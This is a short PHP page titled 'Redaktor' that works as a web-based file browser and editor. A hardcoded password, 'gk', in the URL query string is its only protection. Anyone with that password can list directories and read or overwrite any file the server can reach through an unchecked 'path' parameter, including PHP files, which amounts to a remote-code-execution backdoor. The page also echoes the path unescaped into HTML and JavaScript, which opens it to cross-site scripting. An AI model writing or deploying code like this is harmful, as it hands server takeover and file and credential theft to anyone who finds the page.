<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if (($_GET['pass'] ?? '') !='gk') return '';

$path = $_REQUEST['path'] ?? '.';
if (is_dir($path) == false && isset($_POST['content'])) {
  file_put_contents($path, html_entity_decode($_POST['content']));
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Redaktor</title>
</head>
<body>
<?php
  if (is_dir($path)):
    $files = array_diff(scandir($path), ['.']); ?>
    <ul>
    <?php foreach ($files as $file): ?>
    <li><a href="?path=<?= $path.'/'.$file ?>&pass=<?= $_GET['pass'] ?>"><?= $file ?></a></li>
   <?php endforeach; ?>
    </ul>
<?php else: ?>
<form method="POST">
<input type="hidden" name="path" value="<?= $path ?>">
<div id="editor" style="height: 90vh;"></div>
<textarea id="content" name="content" style="display: none"><?= htmlentities(file_get_contents($path)); ?></textarea>
<input type="submit">
</form>
<script src="ace-builds/src-noconflict/ace.js" type="text/javascript" charset="utf-8"></script>
<script src="ace-builds/src-noconflict/ext-modelist.js" type="text/javascript" charset="utf-8"></script>
<script src="ace-builds/src-noconflict/theme-terminal.js" type="text/javascript" charset="utf-8"></script>
<script>
document.getElementById('editor').textContent = document.getElementById('content').textContent;
var modelist = ace.require("ace/ext/modelist");
var editor = ace.edit("editor");
editor.setOptions({
    autoScrollEditorIntoView: true,
    copyWithEmptySelection: true,
    theme: 'ace/theme/terminal',
});
var mode = modelist.getModeForPath('<?= $path ?>').mode;
editor.session.setMode(mode);
editor.resize();
editor.getSession().on('change', function(){
  document.getElementById('content').textContent = editor.getSession().getValue();
});
</script>
<?php endif; ?>
</body>
</html>
